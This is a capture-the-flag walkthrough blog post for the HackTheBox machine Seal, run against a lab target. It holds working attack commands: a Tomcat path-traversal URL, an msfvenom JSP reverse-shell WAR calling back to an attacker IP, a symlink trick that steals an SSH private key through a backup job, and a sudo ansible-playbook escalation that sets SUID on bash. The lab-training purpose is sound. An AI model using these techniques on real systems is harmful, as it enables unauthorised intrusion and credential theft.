---
title: "Walk-through of Seal from HackTheBox"
header:
  teaser: /assets/images/2021-10-08-17-18-32.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - GitBucket
  - Ansible
  - Feroxbuster
  - MSFVenom
---

## Machine Information

![seal](/assets/images/2021-10-08-17-18-32.png)

Seal is a medium machine on HackTheBox. We start by gaining access to an installation of GitBucket, and after enumeration discover credentials. More brute forcing of the webserver is needed to discover an entry point, and from there we use a malicious WAR file to get our first shell. We find a cronjob which we take advantage of to copy a users private SSH key to an accessible area. Once in as the user we take advantage of misconfigured permissions on an Ansible playbook to run a custom yml file giving us root access.

<!--more-->

Skills required are web and OS enumeration. Skills learned are using MSFVenom, and manipulating Ansible yml files.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Seal](https://www.hackthebox.eu/home/machines/profile/358) |
| Machine Release Date | 10th July 2021 |
| Date I Completed It | 14th October 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/seal]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.250 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/seal]
└─# nmap -p$ports -sC -sV -oA seal 10.10.10.250
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 00:27 BST
Nmap scan report for 10.10.10.250
Host is up (0.023s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: HTTP Status 404 \xE2\x80\x93 Not Found
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Fri, 08 Oct 2021 16:35:33 GMT
<SNIP>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 08 Oct 2021 16:35:32 GMT
|     Set-Cookie: JSESSIONID=node03lvke6zmsxnl1652dc5f5nise122.node0; Path=/; HttpOnly
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>GitBucket</title>
|     <meta property="og:title" content="GitBucket" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://10.10.10.250:8080/" />
|     <meta property="og:image" content="http://10.10.10.250:8080/assets/common/images/gitbucket_ogp.png" />
|     <link rel="icon" href="/assets/common/images/gitbucket.png?20211008150118" ty
|_http-title: GitBucket
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=10/9%Time=6160D3E0%P=x86_64-pc-linux-gnu%r(Ge
<SNIP>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.30 seconds
```

Just three open ports, let's start with the website on 443:

![seal-443](/assets/images/2021-10-08-17-32-32.png)

## GitBucket

Looking around there isn't much, let's look at port 8080:

![seal-8080](/assets/images/2021-10-08-17-32-53.png)

We can create an account and log straight in to [GitBucket](https://gitbucket.github.io/):

![seal-gitbucket](/assets/images/2021-10-08-17-37-43.png)

We see two repository's, there's nothing of interest in the infra one but the seal_market repo has a number of commits:

![seal-commits](/assets/images/2021-10-08-17-43-11.png)

Looking through them I find this commit with credentials in it:

![seal-creds](/assets/images/2021-10-08-17-42-16.png)

## Feroxbuster

With nothing else obvious I try looking for subfolders:

```sh
┌──(root💀kali)-[~/htb/seal]
└─# feroxbuster --url https://seal.htb -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://seal.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
302        0l        0w        0c https://seal.htb/js
302        0l        0w        0c https://seal.htb/admin
302        0l        0w        0c https://seal.htb/css
302        0l        0w        0c https://seal.htb/images
302        0l        0w        0c https://seal.htb/manager
302        0l        0w        0c https://seal.htb/icon
[####################] - 23s    29999/29999   0s      found:6       errors:0      
[####################] - 23s    29999/29999   1289/s  https://seal.htb
```

Trying those subfolders with curl I notice the manager one redirects me to a further subfolder called html:

```sh
┌──(root💀kali)-[~/htb/seal]
└─# curl -k -v https://seal.htb/manager/    
*   Trying 10.10.10.250:443...
* Connected to seal.htb (10.10.10.250) port 443 (#0)
> GET /manager/ HTTP/1.1
> Host: seal.htb
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 09 Oct 2021 16:55:34 GMT
< Content-Type: text/html
< Content-Length: 0
< Connection: keep-alive
< Location: http://seal.htb/manager/html
< 
* Connection #0 to host seal.htb left intact
```

Let's brute force the manager folder to see if we find more in there:

```sh
┌──(root💀kali)-[~/htb/seal]
└─# feroxbuster --url https://seal.htb/manager -k
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://seal.htb/manager
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
302        0l        0w        0c https://seal.htb/manager/images
403        7l       10w      162c https://seal.htb/manager/html
403        7l       10w      162c https://seal.htb/manager/htmlarea
401       63l      291w     2499c https://seal.htb/manager/text
401       63l      291w     2499c https://seal.htb/manager/status
<SNIP>>
[####################] - 35s    29999/29999   0s      found:42      errors:0      
[####################] - 35s    29999/29999   850/s   https://seal.htb/manager
```

## Apache Tomcat

We found 42 folders but only text and status have a 401 return code. Looking at status we get a login box, I used the tomcat creds we found earlier:

![seal-manager](/assets/images/2021-10-09-17-39-05.png)

These worked and I'm at the server status page for Tomcat:

![seal-tomcat](/assets/images/2021-10-09-17-48-06.png)

## Path Traversal

Searching for exploits for Tomcat 9.0.31 I found [this](https://www.rapid7.com/db/vulnerabilities/http-tomcat-directory-traversal/) from Rapid7 that mentions path traversal, and also [this](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) Acunetix one that shows how to take advantage of it.

Looking on the status page I notice the List Applications link goes to here:

```text
https://seal.htb/manager/html/list
```

So I tried using the described exploit to get to this path:

```text
https://seal.htb/manager/status/..;/html
```

It worked and we are in the Application Manager section:

![seal-list](/assets/images/2021-10-09-18-05-15.png)

## MSFVenom

This is just like [Jerry](https://www.hackthebox.eu/home/machines/profile/144), another HackTheBox machine I did a while ago. We can create a war file using MSFVenom and upload it to create a reverse shell:

```sh
┌──(root💀kali)-[~/htb/seal]
└─# msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.251 lport=1337 -f war > pencer.war
Payload size: 1094 bytes
Final size of war file: 1094 bytes
```

Now we can upload it using the button on the page:

![seal-pencer-war](/assets/images/2021-10-10-17-19-01.png)

However, because we are using path traversal to get to this page we will not be able to upload directly:

![seal-403](/assets/images/2021-10-10-17-17-39.png)

We can get around this by intercepting with Burp and changing the upload URL like before

![seal-burp](/assets/images/2021-10-10-17-25-55.png)

Now when we forward that we see our WAR file has been uploaded:

![seal-war](/assets/images/2021-10-10-17-35-04.png)

## Reverse Shell

Start a netcat listener, then click on the link on the applications list to the WAR file I've just uploaded. Switching back we see we have our reverse shell connected:

```sh
┌──(root💀kali)-[~/htb/seal]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.251] from (UNKNOWN) [10.10.10.250] 33470
```

First job is to upgrade our terminal to something more useable:

```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@seal:/var/lib/tomcat9$ ^Z
zsh: suspended  nc -nlvp 1337
┌──(root💀kali)-[~/htb/seal]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 1337
tomcat@seal:/var/lib/tomcat9$ export TERM=xterm
tomcat@seal:/var/lib/tomcat9$ stty rows 52 cols 237
```

## Ansible

That's better. So a quick look at users and we see only one called Luis with a few interesting files in their home folder:

```text
tomcat@seal:/var/lib/tomcat9$ ls -lsa /home/luis/
    4 drwxrwxr-x 3 luis luis     4096 May  7 06:00 .ansible
    4 drwx------ 2 luis luis     4096 May  7 06:10 .ssh
    4 -r-------- 1 luis luis       33 Oct  9 17:27 user.txt
```

We have the user flag, but that's for later as we have no permissions yet. We also see a .ssh folder, so we could be looking at public/private keys possibly hidden. For now I'm more interested in the .ansible folder. [Ansible](https://www.ansible.com/) is an automation platform, so it's reasonable to asusme this will be scripting of some sort.

Let's look inside:

```text
tomcat@seal:/var/lib/tomcat9$ ls -lsa /home/luis/.ansible/
total 12
4 drwxrwxr-x 3 luis luis 4096 May  7 06:00 .
4 drwxr-xr-x 9 luis luis 4096 Oct 10 09:20 ..
4 drwx------ 2 luis luis 4096 Oct 10 17:04 tmp
```

We see just one folder called tmp which we can't access, but the time stands out. It's within a few minutes of the actual time, and if I wait and look again I see it has changed. So there must be a cronjob or similar running. We can look at processes first to see if there's anything obvious:

## Running Processes

```text
tomcat@seal:/var/lib/tomcat9$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2 167340 11312 ?        Ss   00:30   0:03 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    00:30   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   00:30   0:00 [rcu_gp]
<SNIP>
root      182949  0.0  0.0   2608   600 ?        Ss   17:03   0:00 /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
```

## Backups

After a long list we see the last line is a script being run as the user luis. It's an Ansible playbook, let's see if we can look at that yml file:

```text
tomcat@seal:/var/lib/tomcat9$ cat /opt/backups/playbook/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
```

A simple script that copies files from src folder to dest folder. I searched for "copy_links=yes" and [this](https://stackoverflow.com/questions/51351024/ansible-how-to-copy-files-from-a-linked-directory) is the first hit. It explains using that parameter will preserve any symbolic links. We've already found the .ssh folder in luis's home folder, so we can simply link that to anywhere within the backup path to get it copied in to the backup.

```text
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
```

In this section of the script we see it takes the files backed up to /opt/backups/files above, and compresses them in to a gzip file with the current time and date.

```text
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

Last part of the yml file tidies up by deleting anything in /opt/backup/files.

## File Linking

Ok, so first we need to link .ssh to the folder being backed up:

```text
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -lsa
 4 drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
 4 drwxr-xr-x 2 root root  4096 Mar  7  2015 css
 4 drwxr-xr-x 4 root root  4096 Mar  7  2015 images
72 -rw-r--r-- 1 root root 71744 May  6 10:42 index.html
 4 drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
 4 drwxrwxrwx 2 root root  4096 Oct 10 21:21 uploads
```

We see we haven't got permission to link in to the dashboard folder, but we have full rights over the uploads folder. So we will create our symbolic link in there:

```text
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ln -s /home/luis/.ssh/ uploads/
```

Now we just need to wait for the backup to run, then check the archives folder to see the file has been moved there:

```text
tomcat@seal:/opt/backups/archives$ ls -lsa
596 -rw-rw-r-- 1 luis luis 609578 Oct 10 21:21 backup-2021-10-10-21:21:33.gz

tomcat@seal:/opt/backups/archives$ cp backup-2021-10-10-21:21:33.gz /dev/shm/pencer.gz
```

Our file has arrived, I've moved it somewhere safe so we can look inside:

```text
tomcat@seal:/dev/shm$ gzip -kd pencer.gz 

tomcat@seal:/dev/shm$ file pencer
pencer: POSIX tar archive

tomcat@seal:/dev/shm$ tar xvf pencer
dashboard/
dashboard/scripts/
dashboard/images/
dashboard/css/
dashboard/uploads/
dashboard/bootstrap/
dashboard/index.html
dashboard/scripts/flot/
dashboard/scripts/datatables/
<SNIP>
dashboard/uploads/.ssh/
dashboard/uploads/.ssh/id_rsa
dashboard/uploads/.ssh/id_rsa.pub
dashboard/uploads/.ssh/authorized_keys
<SNIP>
```

We've decompressed the backup archive, now we can look at the .ssh folder that was copied in to it:

```text
tomcat@seal:/dev/shm$ ls -lsa
 596 -rw-r-----  1 tomcat tomcat  609578 Oct 10 21:22 pencer.gz
   0 drwxr-x---  7 tomcat tomcat     160 May  7 09:26 dashboard
1592 -rw-r-----  1 tomcat tomcat 1628160 Oct 10 21:22 pencer

tomcat@seal:/dev/shm$ cd dashboard/uploads/.ssh
tomcat@seal:/dev/shm/dashboard/uploads/.ssh$ ls -lsa
4 -rw-r----- 1 tomcat tomcat  563 May  7 06:10 authorized_keys
4 -rw------- 1 tomcat tomcat 2590 May  7 06:10 id_rsa
4 -rw-r----- 1 tomcat tomcat  563 May  7 06:10 id_rsa.pub

tomcat@seal:/dev/shm/dashboard/uploads/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs3kISCeddKacCQhVcpTTVcLxM9q2iQKzi9hsnlEt0Z7kchZrSZsG
<SNIP>
ueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJ
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----
```

## User Access

We have the private key for luis, copy it to our clipboard then over to Kali and paste in to a blank file:

```text
┌──(root💀kali)-[~/htb/seal]
└─# nano id_rsa    

┌──(root💀kali)-[~/htb/seal]
└─# chmod 600 id_rsa
```

With the file prepared we can log in over SSH as luis:

```text
┌──(root💀kali)-[~/htb/seal]
└─# ssh -i id_rsa luis@seal.htb   
The authenticity of host 'seal.htb (10.10.10.250)' can't be established.
ECDSA key fingerprint is SHA256:YTRJC++A+0ww97kJGc5DWAsnI9iusyCE4Nt9fomhxdA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'seal.htb,10.10.10.250' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

Last login: Fri May  7 07:00:18 2021 from 10.10.14.2
luis@seal:~$
```

After grabbing the user flag we can look for our escalation path. I found it straight away:

```text
luis@seal:/dev/shm$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

I searched and found [this](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html) which shows you how to do command execution, so I created my own yml file:

```text
luis@seal:/dev/shm$ cat pencer.yml 
  - name: Check the remote host uptime
    hosts: localhost
    tasks:
      - name: Execute the Uptime command over Command module
        command: "chmod +s /bin/bash" 
```

Here we just add the sticky bit to bash so we can execute as root. Now run the playbook:

```text
luis@seal:/dev/shm$ sudo ansible-playbook pencer.yml
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [Check the remote host uptime] *****************************************************************************************

ASK [Gathering Facts] *******************************************************************************************************
ok: [localhost]

TASK [Execute the Uptime command over Command module] ***********************************************************************
changed: [localhost]

PLAY RECAP ************************************************************************************************
localhost     : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
```

## Root Flag

Now we can escalate to root and grab the flag:

```text
luis@seal:/dev/shm$ /bin/bash -p

bash-5.0# cat /root/root.txt
<HIDDEN>
```

That's another box done. See you next time.
